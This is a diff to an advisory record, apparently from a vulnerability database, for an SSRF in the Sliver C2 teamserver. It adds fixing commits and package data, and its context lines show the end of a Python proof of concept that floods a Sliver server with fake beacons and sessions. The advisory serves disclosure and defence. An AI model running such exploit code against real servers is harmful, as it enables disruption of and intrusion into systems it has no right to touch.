@@ -153,7 +153,16 @@ summary: "SSRF in sliver teamserver\n### Summary\nThe reverse port forwarding in
   \ = reg.SerializeToString()\n  send_envelope(envelope,ip,port)\n\ndescription = '''\nFlood\
   \ a Sliver C2 server with beacons and sessions. Requires an mtls certificate.\n'''\n\nif __name__\
   \ == '__main__':\n  register_session(sys.argv[1], int(sys.argv[2]))\n```"
-impacted_packages: []
+impacted_packages:
+  - purl: pkg:github/bishopfox/sliver
+    affected_versions:
+    fixed_versions:
+    fixed_in_commits:
+      - vcs_url: https://github.com/bishopfox/sliver
+        commit: 0f340a25cf3d496ed870dae7da39eab4427bc16f
+      - vcs_url: https://github.com/bishopfox/sliver
+        commit: 10e245326070c6a5884a02e0790bb7e2baefb3a1
+    introduced_in_commits: []
 severities:
   - score: '6.9'
     scoring_system: cvssv4
